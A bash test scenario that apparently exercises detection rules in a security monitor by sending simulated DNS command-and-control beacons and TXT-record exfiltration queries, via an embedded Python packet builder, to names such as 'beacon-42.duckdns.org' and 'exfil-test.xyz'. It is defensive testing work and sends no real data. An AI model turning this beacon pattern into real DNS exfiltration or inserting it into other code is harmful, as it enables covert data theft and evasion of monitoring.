#!/usr/bin/env bash
# Simulates DNS-based C2 / exfiltration: scripted UDP queries to port 53 with
# suspicious names and TXT lookups. Harmless: packets go to public resolvers
# (or nowhere) and carry no real data.
# Expected detections: SENTINEL-050 (abused TLD / dynamic DNS),
#                      SENTINEL-051 (TXT query),
#                      SENTINEL-052 (shell doing DNS).
set -u
cd "$(dirname "$0")" || exit 1
# shellcheck source=lib.sh
source ./lib.sh

banner "scenario: DNS-based C2 / exfiltration"

banner "python one-liner issuing suspicious DNS queries"
timeout 15 python3 - <<'EOF' 2>/dev/null || true
import socket, struct

def query(server, name, qtype):
    # Minimal DNS query builder (no dnspython dependency).
    tid = 0x1337
    header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    q = b"".join(
        bytes([len(label)]) + label.encode() for label in name.split(".")
    ) + b"\x00"
    q += struct.pack(">HH", qtype, 1)  # qtype, IN
    pkt = header + q
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(1.0)
    try:
        s.sendto(pkt, (server, 53))
    except Exception:
        pass
    finally:
        s.close()

# C2 beacon style: dynamic-DNS + abused TLD (SENTINEL-050)
query("8.8.8.8", "beacon-42.duckdns.org", 1)
query("8.8.8.8", "exfil-test.xyz", 1)
# TXT exfil (SENTINEL-051)
query("8.8.8.8", "exfil-test.xyz", 16)
EOF

banner "done (queries sent from python → SENTINEL-052 on the wire)"
